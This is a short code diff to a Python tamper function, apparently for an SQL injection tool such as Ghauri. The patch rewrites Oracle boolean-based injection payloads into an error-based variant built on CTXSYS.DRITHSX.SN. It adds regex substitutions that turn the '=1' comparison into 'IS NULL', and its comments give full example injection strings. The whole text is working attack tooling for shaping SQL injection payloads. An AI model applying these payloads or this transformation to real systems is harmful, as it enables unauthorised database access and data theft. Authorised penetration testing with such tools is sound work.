@@ -48,6 +48,10 @@ def tamper(payload, **kwargs):
 
     # Replace Oracle CASE WHEN ... THEN 1 ELSE 0 END with CTXSYS version
     # Ghauri uses CTXSYS.DRITHSX.SN to cause error on false branch
+    # Original: AND 4823=(SELECT (CASE WHEN (1=1) THEN 1 ELSE 0 END) FROM DUAL)
+    # Fixed: AND (SELECT (CASE WHEN (1=1) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,0568) END) FROM DUAL) IS NULL
+    
+    # 1. First replace the inner CASE statement
     retVal = re.sub(
         r'THEN\s+1\s+ELSE\s+0\s+END(\s+FROM\s+DUAL)?',
         r'THEN NULL ELSE CTXSYS.DRITHSX.SN(1,0568) END\1',
@@ -55,8 +59,17 @@ def tamper(payload, **kwargs):
         flags=re.IGNORECASE
     )
 
-    # Replace )=1 with ) IS NULL when using CTXSYS (trailing =1 comparison)
+    # 2. Then fix the comparative wrapper
     if 'CTXSYS.DRITHSX.SN' in retVal:
+        # Matches: [AND/OR] [RANDNUM]=(SELECT (CASE ... FROM DUAL))
+        # Becomes: [AND/OR] (SELECT (CASE ... FROM DUAL)) IS NULL
+        retVal = re.sub(
+            r'(\b(?:AND|OR)\s+)?(?:[^\s=]+)\s*=\s*\((SELECT\s+\(CASE.+?FROM\s+DUAL)\)',
+            r'\g<1>(\g<2>) IS NULL',
+            retVal,
+            flags=re.IGNORECASE
+        )
+        # Fallback for standard )=1 suffix (if any)
         retVal = re.sub(r'\)\s*=\s*1(?=\s*($|--))', ') IS NULL', retVal)
 
     return retVal
